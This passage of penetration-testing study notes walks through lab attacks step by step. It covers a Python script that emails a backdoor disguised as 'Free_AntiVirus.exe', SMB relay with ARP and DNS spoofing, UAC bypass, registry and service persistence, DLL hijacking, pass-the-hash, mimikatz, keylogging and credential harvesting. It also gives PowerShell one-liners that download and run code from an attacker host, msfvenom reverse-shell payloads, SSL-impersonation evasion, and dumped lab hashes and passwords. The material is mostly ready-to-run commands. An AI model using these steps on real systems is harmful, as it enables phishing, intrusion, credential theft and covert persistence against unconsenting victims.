msg['To'] = toaddr # storing the subject  msg['Subject'] = \"Subject of the Mail\" # string to store the body of the mail body = \"Body_of_the_mail\" # attach the body with the msg instance msg.attach(MIMEText(body, 'plain')) # open the file to be sent  filename = \"Free_AntiVirus.exe\" attachment = open(\"/root/backdoor.exe\", \"rb\") # instance of MIMEBase and named as p p = MIMEBase('application', 'octet-stream') # To change the payload into encoded form p.set_payload((attachment).read()) # encode into base64 encoders.encode_base64(p) p.add_header('Content-Disposition', \"attachment; filename= %s\" % filename) # attach the instance 'p' to instance 'msg' msg.attach(p) # creates SMTP session s = smtplib.SMTP('demo.ine.local', 25) # Converts the Multipart msg into a string text = msg.as_string() # sending the mail s.sendmail(fromaddr, toaddr, text) # terminating the session s.quit()    Source: https://www.geeksforgeeks.org/send-mail-attachment-gmail-account-using-python/      send the python email and open a listener in meterpreter to receive the shell       get better privilege getsystem getuid      However, we cannot access that machine (10.0.17.12) from the Kali machine. So, here we need to perform pivoting by adding route from the Metasploit framework.    CTRL + C y run autoroute -s 10.0.17.12/20   cat /etc/proxychains4.conf   background use auxiliary/server/socks_proxy show options   set SRVPORT 9050 set VERSION 4a  exploit jobs      run nmap with proxychains to discover open ports in the second machine   \tproxychains nmap demo1.ine.local -sT -Pn -p 1-100      We can forward the port to find the running application name and version. However, looking at them, we can easily guess that port 80 is \\for Httpd service       Step 14: We are forwarding port 80 to the attacker machines port 1234   Commands  sessions -i 1 portfwd add -l 1234 -p 80 -r 10.0.17.12 portfwd list      run nmap in the forwarded port   nmap -sV -p 1234 localhost   searchsploit badblue 2.7    bg search badblue   use exploit/windows/http/badblue_passthru show options      The demo1.ine.local  machine is not accessible from the Kali machine, so we cant use the **reverse_tcp** payload. This is an essential step For us to choose the correct payload. In this case, we have to use the **bind_tcp** payload to gain the meterpreter session.    set RHOSTS demo1.ine.local set PAYLOAD windows/meterpreter/bind_tcp exploit getuid sysinfo   LAB DNS &amp; SMB Relay  myip: 172.16.5.150   internal pentest scope: 172.16.5.0/24   172.16.5.10 - DC - domain 172.16.5.30 - sales.sportsfoo.com 172.16.5.31 - finance.sportsfoo.com   dig @172.16.5.10 -x 172.16.5.10 +nocookie  dig @172.16.5.10 -t AXFR sportsfoo.com +nocookie  cat hostnames.txt marketing consulting sales support department1 department2 department3 department4 department5                            for name in $(cat hostnames.txt); do host $name.sportsfoo.com 172.16.5.10 -W 2; done         grep ‘has address’                     we can use /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt    consulting.sportsfoo.com has address 172.16.5.41 development.sportsfoo.com has address 172.16.5.33 engineering.sportsfoo.com has address 172.16.5.40 fileserver.sportsfoo.com has address 172.16.5.17 intranet.sportsfoo.com has address 10.10.10.10 legal.sportsfoo.com has address 172.16.5.39 marketing.sportsfoo.com has address 172.16.5.32 sales.sportsfoo.com has address 172.16.5.30 security.sportsfoo.com has address 172.16.5.35 support.sportsfoo.com has address 172.16.5.36 www.sportsfoo.com has address 10.10.10.10   Reverse DNS lookups \tcrunch 11 11 -t 172.16.5.%% -o iplist.txt     #!/bin/bash for ip in $(cat iplist.txt); do dig @172.16.5.10 -x $ip +nocookie; done    └─$ ./reverse-dnsscript.sh | grep sportsfoo.com | grep PTR 10.5.16.172.in-addr.arpa. 1200  IN      PTR     dc01.sportsfoo.com. 17.5.16.172.in-addr.arpa. 1200  IN      PTR     fileserver.sportsfoo.com. 30.5.16.172.in-addr.arpa. 3600  IN      PTR     sales.sportsfoo.com. 31.5.16.172.in-addr.arpa. 3600  IN      PTR     finance.sportsfoo.com. 32.5.16.172.in-addr.arpa. 3600  IN      PTR     marketing.sportsfoo.com. 33.5.16.172.in-addr.arpa. 3600  IN      PTR     development.sportsfoo.com. 34.5.16.172.in-addr.arpa. 3600  IN      PTR     customerservice.sportsfoo.com. 35.5.16.172.in-addr.arpa. 3600  IN      PTR     security.sportsfoo.com. 36.5.16.172.in-addr.arpa. 3600  IN      PTR     support.sportsfoo.com. 37.5.16.172.in-addr.arpa. 3600  IN      PTR     players.sportsfoo.com. 38.5.16.172.in-addr.arpa. 3600  IN      PTR     goalkeepers.sportsfoo.com. 39.5.16.172.in-addr.arpa. 3600  IN      PTR     legal.sportsfoo.com. 40.5.16.172.in-addr.arpa. 3600  IN      PTR     engineering.sportsfoo.com. 41.5.16.172.in-addr.arpa. 3600  IN      PTR     consulting.sportsfoo.com. 42.5.16.172.in-addr.arpa. 3600  IN      PTR     commercial.sportsfoo.com. 43.5.16.172.in-addr.arpa. 3600  IN      PTR     coaches.sportsfoo.com. 44.5.16.172.in-addr.arpa. 3600  IN      PTR     doctors.sportsfoo.com. 45.5.16.172.in-addr.arpa. 3600  IN      PTR     delivery.sportsfoo.com.       find live hosts   \tnmap -sP 172.16.5.* -oG - | awk '/Up/{print $2}' &gt; alive.txt &amp;&amp; cat alive.txt      guessing OS with NMAP   \tnmap -O -iL alive.txt --osscan-guess      guessing OS with metasploit   \tuse auxiliary/scanner/smb/smb_version           Scan with nmap            Prepare the SMB Relay       \tuse exploit/windows/smb/smb_relay      send link via email and open in the target machine \there            Task 7 At this point, we are going to deal with a more complicated situation, where users are smart enough to recognize malicious messages. Also, our next target is a W7 box patched against MS08-068 vuln. With that said, we need to launch an attack using SMB Relay in a way that once the W7 system starts an SMB connection to any host on the .sportsfoo.com domain its redirected to our Metasploit server. Then, we can use their credentials to get a shell on the DC.            3 Steps       1 - Lets use the same exploit  \tuse exploit/windows/smb/smb_relay \tset srbhost = our ip \tset smbhost = 172.16.5.10 (Domain Controller)   2 - To redirect the victim to our Metasploit system:  \techo \"172.16.5.150 *.sportsfoo.com\" &gt; dns \tdnsspoof -i tap0 -f dns   3 - MITM attack (poison the traffic between the target and the gateway):  \techo 1 &gt; /proc/sys/net/ipv4/ip_forward \tarpspoof -i tap0 -t 172.16.5.30 172.16.5.1 \tarpspoof -i tap0 -t 172.16.5.1 172.16.5.30      Theory Behind      For example, from the previous results, Windows7 has started an SMB connection \\for \\fileserver01.sportsfoo.com\\AnyShare. Then instead of get a DNS response with the real IP address of fileserver01.sportsfoo.com, it received the IP of the attacker: 172.16.5.153. Consequently, the SMB connection is hijacked to \\172.16.5.153\\AnyShare.       In Metasploit, every time there is an incoming SMB connection, the SMB Relay exploit grab the SMB hashes (credentials) and then uses them to get a shell on the Domain Controller (172.16.5.10 - since it was set in the SMBHOST field of the smb-relay exploit).       This is possible because the credentials in use sportsfoo\\bcaseiro belongs to a domain administrator account. Hence, they can be used to get a shell in any Windows system \\for that domain.       After all the 3 steps. We got a meterpreter shell in DC host.      [!CONFIG]    iptables -L = to list iptables -F = to flush iptables -P FORWARD ACCEPT  // my FORWARD was set to DROP before, that why the packets were not coming from the network   Post Exploitation   The last technical stage before the reporting phase.  * Never forget about the rules of the engagement, make sure you have the permissions and the rights to modify services, machine configurations, escalate privileges, gather sensitive information, delete logs etc * Keep track of actions taken against the compromised machines. This includes date and time, changes made to machines documents, services, applications and configurations, but also private data discovered, methods used to maintain access and so on. This information (containing the list of changes made) should then be included in the final report. * All data discovered and gathered must be protected. This means that you must encrypt it on your pentesting machine, and permanently delete it once the pentest is completed. * Even when reporting sensitive information to your client, such as a screenshot containing username or passwords, be sure to always obfuscate and mask data. * maintain access or persistence, when using backdoor implement some type of authentication ( to avoid others from use it) and delete everything the pentest is complete.   The four post-exploitation steps:      Privilege Escalation and Maintaining Access   Vertical: \tThe attacker is able to move from a lower privileged user to a higher privileged user. For example from a low-end user to administrator or root user.   Horizontal: \tThe attacker keeps the same set or level of privileges but assumes the identity of a different user (he/she does not gain any further privilege).      In this phase we will make sure that our session is: \tStable (does not get dropped) \tPrivileged (can run with high privileges) \tPersistent (through reboots)    STABILITY Windows   Migrate   To avoid losing the session on the target, one of the first tasks to perform is to \"migrate\" the session to another process.   To let Metasploit automatically migrate to another process, we can use: \trun post/windows/manage/migrate \tgetpid = you will see that the process changes \tit will migrate to a process with the same privileges as the current session = notepad.txt   Or we can do it manually:  \tps = to show processes \tmigrate &lt;PID&gt;   Getsystem  getsystem it will automatically find the best technique to elevate privileges.  works only in Windows.  getsystem -t 1 = if u want to run a specific technique getprivs = to show what privileges do we have      We can navigate to exploit/[OS]/local to show which modules metasploit offers    BypassUAC  post/windows/gather/win_privs = to verify if UAC is enabled // if the column is set to true, it means that the remote system has the UAC enabled  search bypassuac      Select the bypassuac_vbs module, since its the newest module   Set the session ID on which the module will be executed   Run the module      if the module completes, we will get a new meterpreter session with highest privileges. Remember that this is a bypass, so UAC will still be enabled on the target. once we have a better shell, we can try getsystem again to try to gain a high privilege access. // set to x64 For better shell   https://github.com/hfiref0x/UACME we can upload UACME with a msfvenom payload  mfvenom -p windows/x64/meterpreter/reverse_tcp   set a listener exploit/multi/handler  // with the same options of the payload background the session   execute the UAC in the target machine  Akagi64.exe 10 &lt;path to the payload.exe&gt;      We should get a new shell in our listener use getsystem    Incognito  https://www.gracefulsecurity.com/privesc-stealing-windows-access-tokens-incognito/ https://technet.microsoft.com/en-us/library/cc759267(v=ws.10).aspx   Thanks to incognito, we can impersonate other valid user tokens on that machine and became that user. being able to switch users gives us the possibility to access different local or domain resources.   in meterpreter session:  use incognito list_tokens -u impersonate_token &lt;token&gt;   Unquoted Service Paths  https://cwe.mitre.org/data/definitions/428.html   with this vuln we are able to abuse the way that Windows searches For executables belonging to a service. // This issue arises when a Windows service has been configured with a path to a service binary which is unquoted, and additionally, contains spaces in its path. // if we have permission in the spaces of the path, we can abuse by putting a malicious program there      Find the vulnerability   query all services and paths  wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\" | findstr /i /v        query a specific service   sc qc AdobARMservice sc qc CIJSRegister      try to stop and start the service without errors   sc stop &lt;service&gt; sc start &lt;service&gt;      SERVICE_START_NAME   \tsc qc &lt;service&gt;      if the service_start_name is set to LocalSystem, this tell us that we will gain system access       next step stop the service:     sc stop &lt;service&gt;           enter the application path:  cd \"C:\\program Files\\Vmware\"   icacls \"path of the service\" icacls \"C:\\Program Files\\OpenVPN\\bin\"   NT AUTHORITY\\Authenticated Users: (OI) (CI) (M) // the (M) = we can modify the content of the directory      Generate a payload in msfvenom and upload to the path of the vuln application   upload payload.exe \"C:\\\\program files\\\\Vmware\\\\Vmware Tools\\\\Vmware.exe\"      Open a listener   exploit/multi/handler      go back to the session and start the service   \tsc start VGAuthservice      we should gain a new session if the shell is unstable background the session set AutoRunScript migrate -n svchost.exe exploit       this will run the script again stop the service again and start we should gain a new shell       with metasploit   use exploit/windows/local/trusted_service_path   STABILITY Linux   OS vulns  sysinfo uname -a      search in google … etc   Compile on the target:  meterpreter &gt; shell / execute -f /bin/sh -i -c gcc --version gcc &lt;program.c&gt; -o exploit ./exploit   Compile on our machine:  Since our OS is 64-bit and the target is 32-bit, we need set gcc parameters accordingly. gcc -m32 -o exploit &lt;program.c&gt; upload to the target, make it executable  run      [+] info A service is running with system privileges and its executable is stored in a folder on which we have write permission. We can use msfvenom to create a payload Inject it with tools like Shellter, BDF and so on. After that we can replace the file with the one just created and force the service to restart. https://www.shellterproject.com/introducing-shellter/ https://github.com/secretsquirrel/the-backdoor-factory    Maintaining Access  The purpose of this phase is to make our presence on the machine persistent - creating a backdoor readily available For later use.  Password and Hashes  run post/windows/gather/smart_hashdump creds or loot = to see the saved hashes  run hashdump // must be system // In case of error, migrate to a differente process and try again   Pass the hash  with the hashes in hand. \tIs a technique that allows us to connect to a remote machine, by means of the hash without using the actual plain-text password.   use exploit/windows/smb/psexec  set SMBPass = the password hash set SMBUser = the username set RHOST = the remote host IP - target      error = STATUS_ACCESS_DENIED if we try the psexec module from a session where our current user is in the Administrator group, but not an actual administrator, and we get a STATUS_ACCESS_DENIED error, this is a good indication that registry changes may be required on the target host in order For a successfull pass-the-hash attack.       The two registry entries needed on the target For this to be successfull are:   HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System \tadd a new DWORD (32-bit) named: LocalAccountTokenFilterPolicy - set its value to 1 HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters \tadd a new DWORD (32-bit) named: RequireSecuritySignature - set its value to 0      via meterpreter:     reg setval -k &lt;hklm...&gt; -v &lt;name&gt; -t &lt;REG_DWORD&gt; -d 1           We can modify via Powershell commands:   \tSet-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord \tSet-ItemProperty -Path HKLM:\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters -Name RequireSecuritySignature -Value 0 -Type DWord      We can modify via reg command:   \treg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f \treg add \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters\" /v RequireSecuritySignature /t REG_DWORD /d 0 /f      moreover = https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/    Pass-The-Hash over RDP  xfreerdp /u:&lt;user&gt; /d:&lt;domain&gt; /pth:&lt;NTLM hash&gt; /v:&lt;ip&gt;   Mimikatz  https://github.com/gentilkiwi/mimikatz/wiki Its a tool able to extract plaintext password, kerberos tickets, perform pass-the-hash attacks etc important to have the current meterpreter session running on a 64-bit process. this allows mimikatz to load all features without any issues   \tps -A x86_64 -s \t// -A = architecture \t// -s = system processes \tmigrate &lt;PID&gt;  load mimikatz \twdigest credentials    Windows Credentials Editor ( WCE )  its a windows binary, so you will have to upload on the remote machine and then run it from meterpreter session.  execute -i -f wce.exe -a -h      moreover - https://web.archive.org/web/20200414231958/http:/www.ampliasecurity.com/research/windows-credentials-editor/    RDP Service  lets check if the RDP service is active, since we wanna use For backdoor access.      meterpreter session:   shell net start  (Remote Desktop Configuration, Remote Desktop Services, Remote Desktop Services UserMode) // only by typing net start, we should see the services available   wmic service where 'Caption like \"Remore%\" and started=true' get Caption  meterpreter:  \trun service_manager -l \trun post/windows/gather/enum_services   Enable - persistence through rdp  run getgui -e = enable rdp //-p &lt;password&gt; -u &lt;user&gt; = if we want to add a new user and password run getgui -e -u talent -p talent      if the target user its not allowed to connect through RDP, we will have to grant him this privilege by adding him to the Remote Desktop Users group. And we have to be sure that the Firewall does not block us       we assume that this group has this policy assigned. Security Settings &gt; Local Policies &gt; User rights Assignment &gt; Allow log on through Remote Desktop Services if the box is hardened this might not be the case       from Windows shell:   net localgroup \"Remote Desktop Users\" els_user /add // \"Remote Desktop Users\" = group we wanna add our user // els-_user = username      Now we can access   rdesktop &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt;   net localgroup    // to list all the groups   net localgroup \"Remote Desktop Users\" // to list the users in that specific group      Now that we have the groups list, we could add the user to one of them.   net localgroup \"group\" &lt;user&gt; /add      We can do the same process with Telnet Verify if the service is running add an user to TelnetClients group This way you can connect back through telnet with the same username/password    Backdoor  goal: use Metasploit in order to generate an executable file (backdoor) that will persist through reboots of the victim machine.      Upload the backdoor on the victim   Execute the file. At prefixed times (5-6-10 seconds), it will try to connect back to our listener   Run it automatically at boot. Depending on the OS, this can be done by editing the Windows Registry, services, schedules, rc.local, init.d   Persistence  meterpreter session:  run persistence  // -h = to show all the options // -A = starts the handler on our machine // -X = start the agent at boot // -X requires SYSTEM privileges // -i 5 = connection attemp each 5 seconds // -p 8080 = port of the connect back // -r &lt;ip&gt; = our ip address  run persistence -A -X -i 5 -p 8080 -r &lt;kali ip&gt; // automatically creates the backdoor, uploads it and sets the registry keys to start it at boot    once the process is complete, if we want a session on the target, we have to start a listener  exploit/multi/handler // set the same options as the backdoor  //another option  exploit/windows/local/persistence    Manual persistence  Suppose we crafted our own backdoor with msfvenom/Veil/BDF \thttps://github.com/Veil-Framework/ \thttps://github.com/secretsquirrel/the-backdoor-factory      Upload the file:   upload &lt;path to backdoor file&gt; &lt;path on target&gt; upload /root/backdoor.exe C:\\\\windows\\      Edit the registry in order to load your file at startup:   reg setval -k &lt;registry key path&gt; -d &lt;value of key&gt; -v &lt;name of key&gt; reg setval -k HKLM\\\\Software\\\\microsoft\\\\windows\\\\currentversion\\\\run -d \"C:\\Windows\\backdoor.exe\" -v backdoor_name    New Users      add a new user:   \tnet user &lt;user&gt; &lt;pass&gt; /add      add to a group:   \tnet localgroup \"group\" &lt;user&gt; /add \tnet localgroup \"Remote Desktop Users\" user /add      [!NOTE] ps: you have to join groups that allow you access to services such as RDP or Telnet       ENABLE RDP via Meterpreter   run getgui -e -u talent -p talent   DLL Hijacking / Preloading / Insecure Library Loading  https://support.microsoft.com/en-us/help/2389418/secure-loading-of-libraries-to-prevent-dll-preloading-attacks   dll hijacking allows us the ability to abuse a built-in behavior in the way that executables, when launched, search For Dynamic Link Libraries (dlls) to import. this behavior is known as the DLL search Order  moreover: https://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx   DLL Search Order     The directory from which the application was launched   The C:\\Windows\\System32 directory   The 16-bit Windows system directory (C:\\windows\\system)   The Windows directory (C:\\windows)   The current directory at the time of execution   Any directories specified by the %PATH% environment variable   Identify  Process Monitor: https://docs.microsoft.com/en-us/sysinternals/downloads/procmon      Create a procmon filter For a specific executable we would like to investigate, (in this case “RegSrvc.exe”), and also, create a filter For “NAME NOT FOUND” For the Result column so we can quickly filter on relevant entries.   Identify cases where the application is looking For a DLL in a directory which we can write to, or modify   Drop our modified payload in the writable directory   Restart the Service, re-launch the application, or wait For the system to be rebooted in the case the executable is in fact associated with a service that starts at boot time, or, alternatively, wait For the user to launch the affected application   Full Example lab 5   Process Explorer  first we open this with administrator privileges search For an application that is running with system privileges, a third party application go to the properties, copy the path check the security of the application and the folder where it is installed check if the user have access   Proc monitor  go to filter add Process Name =  add Result = NAME NOT FOUND add path contains = dll kill the process with process explorer open cmd with administrator privileges restart the process = net start OutpostFirewall go to the proc monitor &gt; should appear some processes we need to choose one that is running with system priveleges and we must have access to the dll folder path in this case there is two &gt; UxTheme.dll and imageres.dll // we have everything we need, we can log in as lowpriv user and exploit   Payload  msfvenom -p windows/meterpreter/reverse_https LHOST=&lt;kali IP&gt; LPORT=4444 -f dll &gt; UxTheme.dll   // in this case we generate a 32-bit payload because the outpost.exe is 32-bit // we can use windows/meterpreter/reverse_tcp, is more reliable but less stealthy   send the payload to the target  // open a web server:  python3 -m http.server   // grab the file in the target machine:  powershell -c iex (New-Object Net.WebClient).DownloadFile('http://&lt;attacker_IP&gt;/UxTheme.dll', 'C:\\Program Files (x86)\\Agnitum\\Outpost Firewall 1.0\\UxTheme.dll')   Handler      set a listener in meterpreter   restart the machine&gt; shutdown /r /t 0      we should get a shell back // it took +/- 4 minutes    Data Harvesting (aka Pillaging)   Pillaging is the step in which you access sensitive data and intellectual property of the target organization Getting local information such as files, enumerating credentials, accounts, IM logs and more, but also network information such as internal network blocks in use, domains, intranet servers, shared hard drivers, printers, repositories, etc.  http://www.pentest-standard.org/index.php/Post_Exploitation#Pillaging  The important thing to remember here is that we need to get as much information as we can:  system info, applications, services, networks, documents, messaging etc   sysinfo getuid      figure out the role of the machine in the remote network            you should try to get answers to questions like: Is this a workstation?   What department is it from (R&amp;D, Marketing, etc)?            Is this a server?   Then what server (mail, web, a RADIUS etc)?       in meterpreter: \trun post/windows/gather \trun post/linux/gather   List services  run post/windows/gather/enum_services // the same result can be obtained by opening Services configuration windows (using GUI)  wmic service get Caption,StartName,Stat,pathname  wmic service where started=true get caption   in shell:  net start // services like DNS or IIS   in meterpreter:  service --status-all   ps = to show processes      part of a domain or DC   net view /domain run post/windows/gather/enum_domains net group \"Domain Controllers\" /domain   list users  net user (win) cat /etc/passwd (linux)   List accounts  run post/windows/gather/enum_ad_bitlocker run post/windows/gather/enum_ad_computers run post/windows/gather/enum_ad_groups run post/windows/gather/enum_ad_service_principal_names run post/windows/gather/enum_ad_to_wordlist run post/windows/gather/enum_ad_user_comments run post/windows/gather/enum_ad_users net user /domain   List Groups  net localgroup = all groups net localgroup &lt;group&gt; = specific group   Shared resources  net share run enum_shares      Moreover Windows:   https://docs.google.com/document/d/1U10isynOpQtrIK6ChuReu-K1WHTJm4fgG3joiuz43rw/edit?hl=en_US   Linux: \thttps://docs.google.com/document/d/1ObQB6hmVvRPCgPTRZM5NMH034VDM-1N-EWPRz2770K4/edit?hl=en_US   OSX: \thttps://docs.google.com/document/d/10AUm_zUdAQGgoHNo_eS0SO1K-24VVYnulUD2x3rJD3k/edit?hl=en_US   Metasploit: \thttps://docs.google.com/document/d/1ZrDJMQkrp_YbU_9Ni9wMNF2m3nIPEA_kekqqqA2Ywto/edit?pref=2&amp;pli=1   Github: \thttps://github.com/mubix/post-exploitation-wiki   tim3warrior: \thttp://tim3warri0r.blogspot.it/   web arquive: \thttps://web.archive.org/web/20150317144317/https:/n0where.net/linux-post-exploitation   Scripts Metasploit  scraper = harvests system info including network shares, registry hives and password hashes winenum = retrieves all kinds of information about the system including environment variables, network interfaces routing, user accounts, etc  run winenum run scraper   capture the current screen of the target  screenshot eog &lt;path to file&gt;   keyloggers  keyscan_start  // keyscan_dump // keyscan_stop   keylogrecorder  -c &lt;option&gt;= which type of key to capture 0 = key presses 1 = winlogon credential capture 2 = no migration      if we want to log the credentials typed when the user unlocks the screen, we will have to attach the session to the winlogon.exe process (which runs on SYSTEM).  if we want to dump keystrokes while the user uses application, we will have to attach the process explorer.exe (which runs on user level)       search   search -d C:\\\\Users\\\\els\\\\ -f *.kdbx kdbx = KeePass extension -d = path where to begin searching from  -f = file pattern to search      Once located the file we need, we can download it to our machine with the command download.    Find credentials  nirsoft = http://www.nirsoft.net/ run post/windows/gather/credentials/... \t// enum_chrome = can be used to gather credentials stored in Google Chrome For example run post/multi/gather/...  - What software is installed run post/windows/gather/enum_applications   External tools  Web Browser Pass View = http://www.nirsoft.net/utils/web_browser_password.html // to extract credentials saved in the web browser installed on the target machine.   Exfiltration over DNS with lodine (DNS Tunneling)  http://beta.ivc.no/wiki/index.php/DNS_Tunneling   // Many organizations are not logging or alerting or anomalous DNS traffic which makes it a go-to vector For exfiltrating data out of a target network, and over often under-monitored channel.   iodine = https://code.kryo.se/iodine/ // Not only can Iodine help with exfiltrating data from a target environment, but it can also help in penetration testing engagements that restrict access to the internet due to authenticated proxies For which we dont have credentials, or can also be used For bypassing captive portals, such as seen commonly in wireless networks.   about the attack: http://beta.ivc.no/wiki/index.php/DNS_Tunneling      pre-requisites:         Control over a domain name that you own and its DNS configuration     An IP address to act as the authoritative Name Server For your domain name For which you have SSH access to as well.      Mapping the Internal Network   network map  ipconfig / ifconfig  ipconfig /displaydns route print / route -v arp netstat   run arp_scanner -h \t// using a exploited machine as the router For our scans. This may help to avoid security measures such as firewalls and IDS run arp_scanner -r    use post/multi/gather/ping_sweep \t// we can set the session in which we would like to run the scan   run netnum -h      Now that we know the addresses of new potential targets, we can scan them and check open ports, enabled services, their operating system and so on. Notice that we are not able to directly access these hosts from our machine, therefore we will have to tunnel our traffic through the session on the exploited machine. This technique is called Pivoting    Pivoting  - option 1 - from msf route add &lt;10.10.10.0&gt; &lt;255.255.255.0&gt; 2 \t// all traffic to 10.10.10.0/24 will be tunneled through session 2 route print = to check the result - option 2 - from the meterpreter session run autoroute -s 10.10.10.0/24 \t// the same result, but it will be routed through the current session run autoroute -p = to check the result      [+] With the route set, we are now able to use the exploited machine (through our meterpreter session) as a router For our communication with the organization internal network (10.10.10.0/24).    use auxiliary/scanner/portscan/tcp //set options   // We can run exploit/psexec and set LHOST to the first target machine // So it will run the exploit in the second target through the traffic of the first target   socks4 proxy  // sometimes metasploit modules are not enough and we may want to run tools like nmap or nessus on these new hosts. In order to do this we will have to set up a socks4 proxy within metasploit and then use tools like proxychains to route the traffic through this proxy.  use auxiliary/server/socks4a // set options // once this module runs, we will see that our host will listen For incoming connection the port netstat -tulpn | grep &lt;port&gt;   Proxychains     is a tool that forces any TCP connection made by any given application, to follow through proxy like SOCKS4, SOCKS5, TOR and so on.   open the /etc/proxychains.conf change the last line to: socks4 127.0.0.1 1080 // we are telling proxychains to use SOCKS4 as proxy, on our local address and port 1080.     [+] how the traffic will be redirect Tools &gt; proxychains &gt; metasploit socks4a proxy - 0.0.0.0:1080 &gt; meterpreter routes &gt; meterpreter sessions &gt; target network       now that everything is configured, we can use a scanning tool, such as nmap, against the hosts within the targets internal network.   proxychains nmap -sT -Pn -n &lt;target ip&gt; --top-ports 50    // by adding proxychains before the nmap scan command, we will force nmap to run through it.      Thanks to this configuration we are able to route packets to networks behind NAT configurations or Firewalls. Moreover, we can use proxychains in order to establish connections to services running or machines within the target network    examples:  proxychains ssh 10.10.10.xx proxychains telnet 10.10.10.xx   Portforward  // allows us to forward connections to specific addresses and ports on the remote network // if we wanna access a web server, a share or any other service on the remote network, we can just set a port forwarding rule through the meterpreter session, and access it from our local address.   in meterpreter:  portfwd add -l 3333 -p 3389 -r &lt;target ip&gt;   open a listener on our local ip address on port 3333 forward the connection to the target IP on port 3389   netstat -tulpn | grep 3333      to show the listening port      [+] traffic  // portfwd listener:3333 &gt; meterpreter session &gt; exploited machine &gt; target machine:3389    rdesktop 127.0.0.1:3333 // try to establish an RDP session to our local IP address on port 3333 // it will open the target machine via port: 3389         Start digging more closely to see if any of the new machines discovered can be exploited    Exploitation through Pivoting   Pass-The-Hash  When the same password is used on multiple hosts within a network and you get the hash of the password from one of these hosts, you automatically have access to all the other machines.   hashdump   use exploit/windows/smb/psexec set options set the SMBPass - a hash instead of the plaintext password   Regular Payload   create a payload:  msfvenom -p windows/x64/meterpreter/reverse_https lhost=&lt;kali ip&gt; lport=443 -f exe &gt; payload.exe   open a listerner:  exploit/multi/handler set options      send the payload to the target and run looking traffic via wireshark, filtering with ssl  this way our attack can be easily identified    Meterpreter SSL Certificate Impersonation and Detection Evasion  search impersonate_ssl use auxiliary/gather/impersonate_ssl     this module request a copy of the remote SLL certificate and creates a local (self.signed) version using the information from the remote version.      set RHOST www.microsoft.com copy the path of .pem file    use payload/windows/x64/meterpreter/reverse_https set options set handlersslcert = paste the path of the .pem file set stagerverifysslcert = true generate -t exe -f payload.exe   set a handler exploit/multi/handler set all the options as you did with the payload handlersslcert, stagerverifysslcert and so on      send the new payload to the target and run      looking through traffic via wireshark this way we could bypass defense engagements because we are using microsoft ssl certificates    Obtaining Stored Credentials with SessionGopher  https://github.com/Arvanaghi/SessionGopher   download to the kali machine open a webserver // python3 -m http.server   go to the target:    powershell.exe -nop -ep bypass -C iex (New-Object Net.WebClient).DownloadString('http://&lt;kali ip&gt;/SessionGopher.ps1'); Invoke-SessionGopher -Thorough -nop = no profile -ep = execution policy -C = command -Thorough = optional, takes longer    Labs   Lab Post-Exploitation   myip: 172.16.5.40 netblock: 10.32.0.0/16   10.32.120.15 Administrator:500:aad3b435b51404eeaad3b435b51404ee:87289513bddc269f9bcb24d74864beb2::: eLSAdmin:1003:14b13fc03687d1a9f76ccb47241e3d88:ad0f2753ef35b6c90833ef47d9f08192::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: HelpAssistant:1000:a88f7de3e682d17fea34bd03086620b5:2b07e52daf608f50d4cd9506c5b0220d::: SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:9f79c84005db73e0122f424022f8dbc0:::   use post/windows/gather/arp_scanner run arp_scanner -r &lt;netblock&gt; multi/gather/ping_sweep   10.32.120.1 10.32.120.8 10.32.120.10 10.32.120.13 10.32.120.17   // 10.32.120.15      auxiliary/scanner/portscan/tcp   10.32.120.8 &gt; 135,139,445 10.32.120.10 &gt; 135,139,445 10.32.120.13 &gt; 135,139,445 10.32.120.17 &gt; 135,139,445  found with run winenum 10.32.121.23   run post/windows/gather/enum_applications  \tFileZilla Client 3.5.3 3.5.3 \tMicrosoft Visual C++ 2008 Redistributable - x86 9.0.30729.4148 \tMicrosoft Visual C++ 2010 x86 Redistributable 10.0.40219 \tSecurity Update \\for Windows XP (KB958644) 1 \tVMware Tools 8.6.0.6261 \tWebFldrs XP 9.50.7523   run post/multi/gather/filezilla_client_cred  \t[*]     Server: 10.32.121.23:21 \t[*]     Protocol: FTP \t[*]     Username: elsuser_ftp \t[*]     Password: FTPStrongPwd      if the password is unreadable, go to shell and get manually  \tC:\\Documents and Settings\\eLSAdmin&gt;cd “Application Data\\Filezilla” \tcd “Application Data\\Filezilla”    C:\\Documents and Settings\\eLSAdmin\\Application Data\\FileZilla&gt;type sitemanager.xml      enable RDP   create a user and add to the Remote Desktop Users group   shell  net user guest_1 guestpwd /add net localgroup \"Remote Desktop Users\" guest_1 /add   meterpreter  run getgui -e   rdesktop 10.32.120.15 -u guest_1      connect to fillezila, enter the credentials to the ftp server that we got earlier we found that we can write in the ftp server root folder add autoroute to this new subnet auxiliary/scanner/portscan/tcp    scan the new ip 10.32.121.23 ports open:  \t21 \t23 \t80 // there is a web server  \t135 \t139 \t445   // lets portfwd to open in our browser   portfwd add -l 8001 -p 80 -r 10.32.121.23   // now we can open in our browser via 127.0.0.1:8001 // because it will redirect to the target 10.32.121.23:80      auxiliary/server/socks_proxy // set the same port as the file /etc/proxychains.conf // now we can open external tools such as hydra to bruteforce the telnet service   // we can try with the users we got via rdesktop in the ftp server  proxychains hydra -l netadmin -P /usr/share/ncrack/default.pwd 10.32.121.23 telnet -V   // we cant use a list of user, because it will kill our meterpreter session      I will try later with the sock4a in the 1080 port, with the 9050 I only got error back    Alternative solution:  auxiliary/scanner/telnet/telnet_login      Since the telnet module of MSF isnt very reliable, you can add a port forward. We add a portfwd from our first meterpreter session we obtained previously.    msf 